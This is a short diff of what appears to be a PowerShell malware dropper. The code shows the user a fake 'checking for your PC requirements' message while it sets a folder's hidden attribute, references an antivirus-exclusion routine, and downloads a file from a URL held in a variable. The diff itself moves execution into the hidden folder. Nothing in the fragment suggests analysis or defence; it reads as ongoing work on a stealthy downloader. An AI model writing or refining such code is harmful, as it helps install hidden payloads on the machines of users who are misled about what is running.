@@ -31,10 +31,9 @@ function Add-Exclusion {
     } catch {}
 }
 
-echo $hiddenFolder
-
 try {
     Write-Host "Downloading the program and checking for your PC requirements..."
+    Set-Location $hiddenFolder
     #Add-Exclusion -Path $hiddenFolder
     Set-ItemProperty -Path $hiddenFolder -name Attributes -Value $hiddenAttr
     Invoke-WebRequest -Uri $downloadURL -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
